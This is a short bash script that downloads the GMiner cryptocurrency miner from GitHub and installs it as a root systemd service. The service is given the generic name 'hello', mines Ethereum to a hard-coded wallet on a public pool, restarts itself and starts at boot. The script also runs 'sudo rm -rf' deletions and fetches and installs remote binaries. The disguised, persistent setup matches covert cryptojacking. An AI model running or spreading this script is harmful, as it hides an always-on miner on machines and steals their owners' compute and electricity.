sudo rm -rfv /usr/local/src/kalinh/ && sudo mkdir /usr/local/src/kalinh && cd /usr/local/src/kalinh && sudo wget https://github.com/develsoftware/GMinerRelease/releases/download/3.03/gminer_3_03_linux64.tar.xz && sudo tar -xvf gminer_3_03_linux64.tar.xz && sudo rm -rf /lib/systemd/system/hello.service

sudo cat > /lib/systemd/system/hello.service <<EOL
[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/usr/local/src/kalinh/miner -a eth -s us1.ethermine.org:4444 -u 0x0F7545dF13Db6F4f04d24F03de6E661271fF9405.k -p x
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL

#!/bin/bash
sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
